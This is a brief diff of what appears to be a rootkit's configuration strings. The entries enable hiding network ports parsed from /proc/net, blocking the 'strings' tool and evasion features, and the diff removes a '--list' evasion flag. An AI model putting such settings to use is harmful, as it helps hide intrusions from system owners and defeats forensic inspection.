@@ -1,4 +1,3 @@
 PROC_NET_STR:%d: %64[0-9A-Fa-f]:%X %64[0-9A-Fa-f]:%X %X %lX:%lX %X:%lX %lX %d %d %lu %512s\n [HIDE_PORTS]
 STRINGS_PATH:*/strings [BLOCK_STRINGS]
 HIDEPORTS:HIDEPORTS [HIDE_PORTS]
-LIST_FLAG:--list [DO_EVASIONS]
